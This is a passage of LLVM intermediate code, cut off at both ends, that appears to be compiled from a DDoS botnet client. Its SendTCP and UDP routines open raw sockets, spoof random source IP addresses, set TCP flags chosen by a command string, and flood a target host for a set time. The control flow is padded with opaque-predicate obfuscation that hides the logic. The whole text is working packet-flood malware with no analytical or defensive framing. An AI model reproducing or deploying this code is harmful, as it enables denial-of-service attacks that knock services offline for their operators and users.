  %357 = call zeroext i16 @csum(i16* %352, i32 %356)
  %358 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 7
  store i16 %357, i16* %359, align 2
  %360 = call i64 @time(i64* null) #5
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %_ = sub i64 0, %360
  %gen = add i64 %_, %362
  %_11 = sub i64 0, %360
  %gen12 = add i64 %_11, %362
  %_13 = sub i64 %360, %362
  %gen14 = mul i64 %_13, %362
  %_15 = shl i64 %360, %362
  %_16 = sub i64 %360, %362
  %gen17 = mul i64 %_16, %362
  %_18 = sub i64 %360, %362
  %gen19 = mul i64 %_18, %362
  %_20 = shl i64 %360, %362
  %363 = add nsw i64 %360, %362
  %364 = trunc i64 %363 to i32
  store i32 %364, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %originalBB10

originalBB24alteredBB:                            ; preds = %originalBB24, %211
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %228
  %365 = load i32, i32* %15, align 4
  %366 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %367 = call i64 @sendto(i32 %365, i8* %126, i64 %124, i32 0, %struct.sockaddr* %366, i32 16)
  %368 = call i32 @rand_cmwc()
  %369 = trunc i32 %368 to i16
  %370 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i32 0, i32 0
  %372 = bitcast %union.anon.1* %371 to %struct.anon.2*
  %373 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %372, i32 0, i32 0
  store i16 %369, i16* %373, align 2
  %374 = load i32, i32* %8, align 4
  %375 = icmp eq i32 %374, 0
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %256
  %376 = call i32 @rand_cmwc()
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %279
  %377 = trunc i32 %280 to i16
  %378 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %379 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %378, i32 0, i32 0
  %380 = bitcast %union.anon.1* %379 to %struct.anon.2*
  %381 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %380, i32 0, i32 1
  store i16 %377, i16* %381, align 2
  %382 = call i32 @rand_cmwc()
  %383 = trunc i32 %382 to i16
  %384 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 3
  store i16 %383, i16* %385, align 4
  %386 = load i32, i32* %18, align 4
  %387 = call i32 @getRandomIP(i32 %386)
  %388 = call i32 @htonl(i32 %387) #10
  %389 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 8
  store i32 %388, i32* %390, align 4
  %391 = bitcast i8* %126 to i16*
  %392 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 2
  %394 = load i16, i16* %393, align 2
  %395 = zext i16 %394 to i32
  %396 = call zeroext i16 @csum(i16* %391, i32 %395)
  %397 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %398 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %397, i32 0, i32 7
  store i16 %396, i16* %398, align 2
  %399 = load i32, i32* %23, align 4
  %400 = load i32, i32* %14, align 4
  %401 = icmp eq i32 %399, %400
  br label %originalBB37
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %61

; <label>:44:                                     ; preds = %39
  %45 = load i32, i32* @x.79
  %46 = load i32, i32* @y.80
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = load i32, i32* @x.79
  %54 = load i32, i32* @y.80
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %543

; <label>:61:                                     ; preds = %39
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %63 = getelementptr inbounds [8 x i8], [8 x i8]* %62, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 8, i32 4, i1 false)
  %64 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %64, i32* %17, align 4
  %65 = load i32, i32* %17, align 4
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %84, label %67

; <label>:67:                                     ; preds = %61
  %68 = load i32, i32* @x.79
  %69 = load i32, i32* @y.80
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %67
  %76 = load i32, i32* @x.79
  %77 = load i32, i32* @y.80
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %543

; <label>:84:                                     ; preds = %61
  store i32 1, i32* %18, align 4
  %85 = load i32, i32* %17, align 4
  %86 = bitcast i32* %18 to i8*
  %87 = call i32 @setsockopt(i32 %85, i32 0, i32 3, i8* %86, i32 4) #5
  %88 = icmp slt i32 %87, 0
  br i1 %88, label %89, label %106

; <label>:89:                                     ; preds = %84
  %90 = load i32, i32* @x.79
  %91 = load i32, i32* @y.80
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %89
  %98 = load i32, i32* @x.79
  %99 = load i32, i32* @y.80
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %543

; <label>:106:                                    ; preds = %84
  %107 = load i32, i32* %14, align 4
  %108 = icmp eq i32 %107, 0
  br i1 %108, label %109, label %110

; <label>:109:                                    ; preds = %106
  store i32 0, i32* %19, align 4
  br label %116

; <label>:110:                                    ; preds = %106
  %111 = load i32, i32* %14, align 4
  %112 = sub nsw i32 32, %111
  %113 = shl i32 1, %112
  %114 = sub nsw i32 %113, 1
  %115 = xor i32 %114, -1
  store i32 %115, i32* %19, align 4
  br label %116

; <label>:116:                                    ; preds = %110, %109
  %117 = load i32, i32* %12, align 4
  %118 = sext i32 %117 to i64
  %119 = add i64 40, %118
  %120 = call i8* @llvm.stacksave()
  store i8* %120, i8** %20, align 8
  %121 = alloca i8, i64 %119, align 16
  %122 = bitcast i8* %121 to %struct.iphdr*
  store %struct.iphdr* %122, %struct.iphdr** %21, align 8
  %123 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %124 = bitcast %struct.iphdr* %123 to i8*
  %125 = getelementptr i8, i8* %124, i64 20
  %126 = bitcast i8* %125 to %struct.tcphdr*
  store %struct.tcphdr* %126, %struct.tcphdr** %22, align 8
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %129 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %128, i32 0, i32 0
  %130 = load i32, i32* %129, align 4
  %131 = load i32, i32* %19, align 4
  %132 = call i32 @getRandomIP(i32 %131)
  %133 = call i32 @htonl(i32 %132) #10
  %134 = load i32, i32* %12, align 4
  %135 = sext i32 %134 to i64
  %136 = add i64 20, %135
  %137 = trunc i64 %136 to i32
  call void @makeIPPacket(%struct.iphdr* %127, i32 %130, i32 %133, i8 zeroext 6, i32 %137)
  %138 = call i32 @rand_cmwc()
  %139 = trunc i32 %138 to i16
  %140 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %141 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %140, i32 0, i32 0
  %142 = bitcast %union.anon* %141 to %struct.anon.0*
  %143 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %142, i32 0, i32 0
  store i16 %139, i16* %143, align 4
  %144 = call i32 @rand_cmwc()
  %145 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %146 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %145, i32 0, i32 0
  %147 = bitcast %union.anon* %146 to %struct.anon.0*
  %148 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %147, i32 0, i32 2
  store i32 %144, i32* %148, align 4
  %149 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon* %150 to %struct.anon.0*
  %152 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %151, i32 0, i32 3
  store i32 0, i32* %152, align 4
  %153 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %154 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %153, i32 0, i32 0
  %155 = bitcast %union.anon* %154 to %struct.anon.0*
  %156 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %155, i32 0, i32 4
  %157 = load i16, i16* %156, align 4
  %158 = and i16 %157, -241
  %159 = or i16 %158, 80
  store i16 %159, i16* %156, align 4
  %160 = load i8*, i8** %11, align 8
  %161 = call i32 @strcmp(i8* %160, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.538, i32 0, i32 0)) #9
  %162 = icmp ne i32 %161, 0
  br i1 %162, label %199, label %163

; <label>:163:                                    ; preds = %116
  %164 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %165 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %164, i32 0, i32 0
  %166 = bitcast %union.anon* %165 to %struct.anon.0*
  %167 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %166, i32 0, i32 4
  %168 = load i16, i16* %167, align 4
  %169 = and i16 %168, -513
  %170 = or i16 %169, 512
  store i16 %170, i16* %167, align 4
  %171 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %172 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %171, i32 0, i32 0
  %173 = bitcast %union.anon* %172 to %struct.anon.0*
  %174 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %173, i32 0, i32 4
  %175 = load i16, i16* %174, align 4
  %176 = and i16 %175, -1025
  %177 = or i16 %176, 1024
  store i16 %177, i16* %174, align 4
  %178 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %179 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon* %179 to %struct.anon.0*
  %181 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %180, i32 0, i32 4
  %182 = load i16, i16* %181, align 4
  %183 = and i16 %182, -257
  %184 = or i16 %183, 256
  store i16 %184, i16* %181, align 4
  %185 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %186 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %185, i32 0, i32 0
  %187 = bitcast %union.anon* %186 to %struct.anon.0*
  %188 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %187, i32 0, i32 4
  %189 = load i16, i16* %188, align 4
  %190 = and i16 %189, -4097
  %191 = or i16 %190, 4096
  store i16 %191, i16* %188, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 0
  %194 = bitcast %union.anon* %193 to %struct.anon.0*
  %195 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %194, i32 0, i32 4
  %196 = load i16, i16* %195, align 4
  %197 = and i16 %196, -2049
  %198 = or i16 %197, 2048
  store i16 %198, i16* %195, align 4
  br label %385

; <label>:199:                                    ; preds = %116
  %200 = load i32, i32* @x.79
  %201 = load i32, i32* @y.80
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %199
  %208 = load i8*, i8** %11, align 8
  %209 = call i8* @strtok(i8* %208, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.539, i32 0, i32 0)) #5
  store i8* %209, i8** %23, align 8
  %210 = load i32, i32* @x.79
  %211 = load i32, i32* @y.80
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %218

; <label>:218:                                    ; preds = %382, %originalBBpart212
  %219 = load i32, i32* @x.79
  %220 = load i32, i32* @y.80
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %218
  %227 = load i8*, i8** %23, align 8
  %228 = icmp ne i8* %227, null
  %229 = load i32, i32* @x.79
  %230 = load i32, i32* @y.80
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %228, label %237, label %384

; <label>:237:                                    ; preds = %originalBBpart216
  %238 = load i8*, i8** %23, align 8
  %239 = call i32 @strcmp(i8* %238, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.540, i32 0, i32 0)) #9
  %240 = icmp ne i32 %239, 0
  br i1 %240, label %265, label %241

; <label>:241:                                    ; preds = %237
  %242 = load i32, i32* @x.79
  %243 = load i32, i32* @y.80
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %241
  %250 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 0
  %252 = bitcast %union.anon* %251 to %struct.anon.0*
  %253 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %254, -513
  %256 = or i16 %255, 512
  store i16 %256, i16* %253, align 4
  %257 = load i32, i32* @x.79
  %258 = load i32, i32* @y.80
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBBpart227, label %originalBB18alteredBB

originalBBpart227:                                ; preds = %originalBB18
  br label %382

; <label>:265:                                    ; preds = %237
  %266 = load i8*, i8** %23, align 8
  %267 = call i32 @strcmp(i8* %266, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.541, i32 0, i32 0)) #9
  %268 = icmp ne i32 %267, 0
  br i1 %268, label %277, label %269

; <label>:269:                                    ; preds = %265
  %270 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %271 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %270, i32 0, i32 0
  %272 = bitcast %union.anon* %271 to %struct.anon.0*
  %273 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %272, i32 0, i32 4
  %274 = load i16, i16* %273, align 4
  %275 = and i16 %274, -1025
  %276 = or i16 %275, 1024
  store i16 %276, i16* %273, align 4
  br label %365

; <label>:277:                                    ; preds = %265
  %278 = load i8*, i8** %23, align 8
  %279 = call i32 @strcmp(i8* %278, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.542, i32 0, i32 0)) #9
  %280 = icmp ne i32 %279, 0
  br i1 %280, label %289, label %281

; <label>:281:                                    ; preds = %277
  %282 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 0
  %284 = bitcast %union.anon* %283 to %struct.anon.0*
  %285 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %284, i32 0, i32 4
  %286 = load i16, i16* %285, align 4
  %287 = and i16 %286, -257
  %288 = or i16 %287, 256
  store i16 %288, i16* %285, align 4
  br label %364

; <label>:289:                                    ; preds = %277
  %290 = load i32, i32* @x.79
  %291 = load i32, i32* @y.80
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %289
  %298 = load i8*, i8** %23, align 8
  %299 = call i32 @strcmp(i8* %298, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.543, i32 0, i32 0)) #9
  %300 = icmp ne i32 %299, 0
  %301 = load i32, i32* @x.79
  %302 = load i32, i32* @y.80
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %300, label %333, label %309

; <label>:309:                                    ; preds = %originalBBpart231
  %310 = load i32, i32* @x.79
  %311 = load i32, i32* @y.80
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %309
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon* %319 to %struct.anon.0*
  %321 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %320, i32 0, i32 4
  %322 = load i16, i16* %321, align 4
  %323 = and i16 %322, -4097
  %324 = or i16 %323, 4096
  store i16 %324, i16* %321, align 4
  %325 = load i32, i32* @x.79
  %326 = load i32, i32* @y.80
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBBpart256, label %originalBB33alteredBB

originalBBpart256:                                ; preds = %originalBB33
  br label %363

; <label>:333:                                    ; preds = %originalBBpart231
  %334 = load i8*, i8** %23, align 8
  %335 = call i32 @strcmp(i8* %334, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.544, i32 0, i32 0)) #9
  %336 = icmp ne i32 %335, 0
  br i1 %336, label %361, label %337

; <label>:337:                                    ; preds = %333
  %338 = load i32, i32* @x.79
  %339 = load i32, i32* @y.80
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %337
  %346 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %347 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %346, i32 0, i32 0
  %348 = bitcast %union.anon* %347 to %struct.anon.0*
  %349 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %348, i32 0, i32 4
  %350 = load i16, i16* %349, align 4
  %351 = and i16 %350, -2049
  %352 = or i16 %351, 2048
  store i16 %352, i16* %349, align 4
  %353 = load i32, i32* @x.79
  %354 = load i32, i32* @y.80
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart270, label %originalBB58alteredBB

originalBBpart270:                                ; preds = %originalBB58
  br label %362

; <label>:361:                                    ; preds = %333
  br label %362

; <label>:362:                                    ; preds = %361, %originalBBpart270
  br label %363

; <label>:363:                                    ; preds = %362, %originalBBpart256
  br label %364

; <label>:364:                                    ; preds = %363, %281
  br label %365

; <label>:365:                                    ; preds = %364, %269
  %366 = load i32, i32* @x.79
  %367 = load i32, i32* @y.80
  %368 = sub i32 %366, 1
  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %365
  %374 = load i32, i32* @x.79
  %375 = load i32, i32* @y.80
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %382

; <label>:382:                                    ; preds = %originalBBpart274, %originalBBpart227
  %383 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %383, i8** %23, align 8
  br label %218

; <label>:384:                                    ; preds = %originalBBpart216
  br label %385

; <label>:385:                                    ; preds = %384, %163
  %386 = load i32, i32* @x.79
  %387 = load i32, i32* @y.80
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %385
  %394 = call i32 @rand_cmwc()
  %395 = trunc i32 %394 to i16
  %396 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 0
  %398 = bitcast %union.anon* %397 to %struct.anon.0*
  %399 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %398, i32 0, i32 5
  store i16 %395, i16* %399, align 2
  %400 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %401 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %400, i32 0, i32 0
  %402 = bitcast %union.anon* %401 to %struct.anon.0*
  %403 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %402, i32 0, i32 6
  store i16 0, i16* %403, align 4
  %404 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 0
  %406 = bitcast %union.anon* %405 to %struct.anon.0*
  %407 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %406, i32 0, i32 7
  store i16 0, i16* %407, align 2
  %408 = load i32, i32* %9, align 4
  %409 = icmp eq i32 %408, 0
  %410 = load i32, i32* @x.79
  %411 = load i32, i32* @y.80
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %409, label %418, label %420

; <label>:418:                                    ; preds = %originalBBpart278
  %419 = call i32 @rand_cmwc()
  br label %425

; <label>:420:                                    ; preds = %originalBBpart278
  %421 = load i32, i32* %9, align 4
  %422 = trunc i32 %421 to i16
  %423 = call zeroext i16 @htons(i16 zeroext %422) #10
  %424 = zext i16 %423 to i32
  br label %425

; <label>:425:                                    ; preds = %420, %418
  %426 = phi i32 [ %419, %418 ], [ %424, %420 ]
  %427 = trunc i32 %426 to i16
  %428 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 0
  %430 = bitcast %union.anon* %429 to %struct.anon.0*
  %431 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %430, i32 0, i32 1
  store i16 %427, i16* %431, align 2
  %432 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %433 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %434 = call zeroext i16 @tcpcsum(%struct.iphdr* %432, %struct.tcphdr* %433)
  %435 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 0
  %437 = bitcast %union.anon* %436 to %struct.anon.0*
  %438 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %437, i32 0, i32 6
  store i16 %434, i16* %438, align 4
  %439 = bitcast i8* %121 to i16*
  %440 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %441 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %440, i32 0, i32 2
  %442 = load i16, i16* %441, align 2
  %443 = zext i16 %442 to i32
  %444 = call zeroext i16 @csum(i16* %439, i32 %443)
  %445 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %446 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %445, i32 0, i32 7
  store i16 %444, i16* %446, align 2
  %447 = call i64 @time(i64* null) #5
  %448 = load i32, i32* %10, align 4
  %449 = sext i32 %448 to i64
  %450 = add nsw i64 %447, %449
  %451 = trunc i64 %450 to i32
  store i32 %451, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %452

; <label>:452:                                    ; preds = %originalBBpart288, %521, %425
  %453 = load i32, i32* @x.79
  %454 = load i32, i32* @y.80
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
